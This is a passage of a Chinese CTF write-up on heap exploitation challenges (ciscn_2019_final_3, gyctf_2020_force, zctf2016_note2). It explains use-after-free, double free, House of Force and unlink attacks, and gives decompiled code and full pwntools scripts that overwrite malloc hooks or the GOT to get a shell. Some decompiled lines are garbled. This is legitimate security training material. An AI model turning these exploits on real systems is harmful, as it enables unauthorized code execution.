    add(2,0x20)
    add(2,0x20)
    add(2,0x20)
    delete(2)
    add(1,0x30)
    delete(2)
    addr_chunk0_prev_size = display(2) - 0xa0
    print(hex(addr_chunk0_prev_size))
    add(2, addr_chunk0_prev_size)
    add(2, addr_chunk0_prev_size)
    add(2, 0x91)
    for i in range(0, 7):
        delete(1)
        add(2, 0x20)
    delete(1)
    main_arena = display(1) - 96
    print(hex(main_arena))
    libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10
    stdin = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70
    add(1, stdin)
    add(1, 0x30) 
    delete(1)
    add(2, 0x20)
    delete(1)
    addr_chunk0_fd = display(1) - 0x30
    add(1, addr_chunk0_fd)
    add(1, addr_chunk0_fd)
    add(1, 111)
    add(1, 666)
    io.sendlineafter('which command?\n> ', '4')
    io.recvuntil('your message :')
    io.interactive()
## 0x12 ciscn_2019_final_3
这题只有两个功能，添加和删除，不过在进行添加的时候，他会帮我们把malloc后的地址进行输出，我们想要泄露出libc的基址的话就可以分配到unsortbin的bins头处，然后输出地址，就可以泄露出libc的基址了。
然后在删除的函数中，对chunk进行free后没有置零，存在UAF漏洞
    unsigned __int64 delete()
    {
      __int64 v0; // rax
      unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF
      unsigned __int64 v3; // [rsp+8h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      v0 = std::operator>(&std::cout, "input the index");
      std::ostream::operator>);
      std::istream::operator>>(&std::cin, &v2);
      if ( v2 > 0x18 )
        exit(0);
      free(*((void **)&unk_2022A0 + v2));
      return __readfsqword(0x28u) ^ v3;
    }
但是在进行分配时，对我们输入的size进行了限制，不能大于0x78，在有tcache的情况下，free后size小于0x400时不会进入unsortbin中，于是我们只能想办法修改chunk的size位了。
    unsigned __int64 sub_CE1()
    {
      __int64 v0; // rax
      __int64 v1; // rax
      unsigned int v2; // ebx
      __int64 v3; // rax
      size_t size; // [rsp+0h] [rbp-20h] BYREF
      unsigned __int64 v6; // [rsp+8h] [rbp-18h]
      v6 = __readfsqword(0x28u);
      v0 = std::operator>(&std::cout, "input the index");
      std::ostream::operator>);
      std::istream::operator>>(&std::cin, (char *)&size + 4);
      if ( *((_QWORD *)&unk_2022A0 + HIDWORD(size)) || HIDWORD(size) > 0x18 )
        exit(0);
      v1 = std::operator>(&std::cout, "input the size");
      std::ostream::operator>);
      std::istream::operator>>(&std::cin, &size);
      if ( (unsigned int)size >(&std::cout, "now you can write something");
        std::ostream::operator>);
        sub_CBB(*((_QWORD *)&unk_2022A0 + HIDWORD(size)), (unsigned int)size);
        puts("OK!");
        printf("gift :%p\n", *((const void **)&unk_2022A0 + HIDWORD(size)));
      }
      return __readfsqword(0x28u) ^ v6;
    }
先分配一系列chunk，使其size加起来超过0x420，然后利用double
free将chunk分配到chunk0处，修改chunk0的size位，这时free掉chunk0和chunk1，chunk0就不会进入tcache了，而是进入unsortbin中，然后我们分配0x78的大小，使得剩下的free
chunk的fd指针刚好在chunk1的fd指针处，然后申请一块chunk，再申请相同大小chunk，就分配到了unsortbin的bins头处，就泄露出libc的基址了。
之后再利用double free修改 `__malloc_hook` 为one_gadget，即可getshell。
exp:
    from pwn import *
    context(log_level='debug', arch='amd64', os='linux')
    io = process('./ciscn_final_3', env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF('./libc.so.6')
    def add(index, size, content):
        io.sendlineafter('> ', str(1))
        io.sendlineafter('index\n', str(index))
        io.sendlineafter('size\n', str(size))
        io.sendlineafter('something', content)
        io.recvuntil('gift :')
        return int(io.recvline()[2:],16)
    def delete(index):
        io.sendlineafter('> ', str(2))
        io.sendlineafter('index\n', str(index))
    heap = add(0, 0x78, 'a')
    add(1, 0x18, 'a')
    add(2, 0x78, 'a')
    add(3, 0x78, 'a')
    add(4, 0x78, 'a')
    add(5, 0x78, 'a')
    add(6, 0x78, 'a')
    add(7, 0x78, 'a')
    add(8, 0x78, 'a')
    add(9, 0x28, 'a')
    delete(9)
    delete(9)
    add(10, 0x28, p64(heap - 0x10))
    add(11, 0x28, p64(heap - 0x10))
    add(12, 0x28, p64(0) + p64(0x421))
    delete(0)
    delete(1)
    add(13, 0x78, 'a')
    add(14, 0x18, 'a')
    libc_base = add(15, 0x18, 'a') - 0x3ebca0
    print('libc_base -> ' + hex(libc_base))
    one_gadget = libc_base + 0x10a38c
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    delete(2)
    delete(2)
    add(16, 0x78, p64(malloc_hook))
    add(17, 0x78, p64(malloc_hook))
    add(18, 0x78, p64(one_gadget))
    io.sendline('1')
    io.sendline('22')
    io.interactive()
## 0x13 gyctf_2020_force
只有分配chunk的功能，可以分配最多40个chunk，而且没有限制分配的大小，在进行输入时固定输入0x50个字符，也就是说我们分配较小空间时存在溢出。
    unsigned __int64 add()
    {
      const void **i; // [rsp+0h] [rbp-120h]
      __int64 size; // [rsp+8h] [rbp-118h]
      char s[256]; // [rsp+10h] [rbp-110h] BYREF
      unsigned __int64 v4; // [rsp+118h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      memset(s, 255, sizeof(s));
      for ( i = (const void **)&unk_202080; *i; ++i )
        ;
      if ( (char *)i - (char *)&unk_202080 > 39 )
        exit(0);
      puts("size");
      read(0, nptr, 0xFuLL);
      size = atol(nptr);
      *i = malloc(size);
      if ( !*i )
        exit(0);
      printf("bin addr %p\n", *i);
      puts("content");
      read(0, (void *)*i, 0x50uLL);
      puts("done");
      return __readfsqword(0x28u) ^ v4;
    }
存在溢出，不限制分配大小，加上题目名称，可以想到House of Force，通过修改top chunk的size位来实现任意地址分配。
首先我们要先想办法获取libc的基址，当我们申请一个极大Chunk时，程序会调用mmap进行内存分配，分配下来的地址之后就是是libc，虽然开启了PIE，但是偏移都是固定的，可以算出libc的基址。
有了libc的基址，由于开启了FULL RELRO，不能修改got表，那就将one_gadget写入 `__malloc_hook`
，但是这题栈上不满足one_gadget的条件，所以我们可以将one_gadget写入 `__realloc_hook`
，通过realloc来调整帧栈，使其满足条件。
首先我们来修改top chunk的size位，将其修改为最大值，然后算出偏移，抬高top chunk，再进行分配，将其分配到
`__realloc_hook` 附近，然后覆盖 `__realloc_hook` 的值为one_gadget，修改 `__malloc_hook` 的值为
`realloc + 0x10` 的值，借助realloc来调整帧栈，然后进行分配，调用`__malloc_hook` ，`__malloc_hook`
调用 `realloc + 0x10` ，调用 `__realloc_hook` 就能够getshell了。
exp:
    rom pwn import *
    # context(log_level='debug', os='linux', arch='amd64')
    io = process('./gyctf_2020_force',env={"LD_PRELOAD": "./libc-2.23.so"})
    # io = remote('node3.buuoj.cn', 26073)
    libc = ELF('./libc-2.23.so')
    def add(size, content):
        io.sendlineafter('2:puts\n', str(1))
        io.sendlineafter('size\n', str(size))
        io.recvuntil('bin addr 0x')
        address = int(io.recv(12), 16)
        io.sendafter('content\n', content)
        return address
    libc_base = add(0x200000, 'aaaa\n') +0x200ff0
    print(hex(libc_base))
    one_gadget = 0x4526a + libc_base
    print('one_gadget -> ' + hex(one_gadget))
    heap_addr = add(0x18, 'a' * 0x10 + p64(0) + p64(0xffffffffffffffff))
    print(hex(heap_addr))
    top_chunk = heap_addr + 0x10
    malloc_hook = libc.symbols['__malloc_hook'] + libc_base
    realloc = libc.symbols["__libc_realloc"] + libc_base
    offset = malloc_hook - top_chunk
    add(offset - 0x33, 'content')
    add(0x10, 'a' * 8 + p64(one_gadget) + p64(realloc + 0x10))
    gdb.attach(io)
    io.sendlineafter('2:puts\n', str(1))
    io.sendlineafter('size\n', str(20))
    io.interactive()
## 0x14 zctf2016_note2
还是菜单题，添加、修改、输出、删除四个功能。
先看看添加，限制了我们申请的大小，不能超过0x80，而且最多只能申请四个chunk，有存放chunk的数组指针ptr。
    int add()
    {
      unsigned int v1; // eax
      unsigned int size; // [rsp+4h] [rbp-Ch]
      void *size_4; // [rsp+8h] [rbp-8h]
      if ( (unsigned int)note_num > 3 )
        return puts("note lists are full");
      puts("Input the length of the note content:(less than 128)");
      size = input_num();
      if ( size > 0x80 )
        return puts("Too long");
      size_4 = malloc(size);
      puts("Input the note content:");
      input((__int64)size_4, size, 10);
      sub_400B10(size_4);
      *(&ptr + (unsigned int)note_num) = size_4;
      array_size[note_num] = size;
      v1 = note_num++;
      return printf("note add success, the id is %d\n", v1);
    }
这里使用了input函数来进行输入，我们来看看input函数，这里循环的判断条件为 `length - 1 > i`
，而i是无符号整数，也就是说如果我们申请时输入的大小为0，那么 `0 - 1 = -1` ，转化成无符号整数与i比较，那么就意味着我们可以随意进行溢出。
    unsigned __int64 __fastcall input(__int64 address, __int64 length, char enter)
    {
      char buf; // [rsp+2Fh] [rbp-11h] BYREF
      unsigned __int64 i; // [rsp+30h] [rbp-10h]
      ssize_t v7; // [rsp+38h] [rbp-8h]
      for ( i = 0LL; length - 1 > i; ++i )
      {
        v7 = read(0, &buf, 1uLL);
        if ( v7 = 0 && v2 <= 3 )
        {
          src = (char *)*(&ptr + v2);
          v5 = array_size[v2];
          if ( src )
          {
            puts("do you want to overwrite or append?[1.overwrite/2.append]");
            v3 = input_num();
            if ( v3 == 1 || v3 == 2 )
            {
              if ( v3 == 1 )
                dest[0] = 0;
              else
                strcpy(dest, src);
              v7 = malloc(0xA0uLL);
              strcpy((char *)v7, "TheNewContents:");
              printf((const char *)v7);
              input((__int64)v7 + 15, 0x90LL, 10);
              sub_400B10((const char *)v7 + 15);
              v0 = v7;
              v0[v5 - strlen(dest) + 14] = 0;
              strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);
              strcpy(src, dest);
              free(v7);
              puts("Edit note success!");
            }
            else
            {
              puts("Error choice!");
            }
          }
          else
          {
            puts("note has been deleted");
          }
        }
      }
      else
      {
        puts("Please add a note!");
      }
      return __readfsqword(0x28u) ^ v8;
    }
存在可利用的堆溢出，有全局数组指针，没开启RELRO保护，显然可以利用UNlink攻击。
通过申请size为0的chunk来进行溢出修改下一chunk的chunk头来达到UNlink的效果，然后修改atoi函数的got表，输入 `/bin/sh`
getshell。
exp:
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    # io = process('./note2')
    io = remote('node3.buuoj.cn', 29650)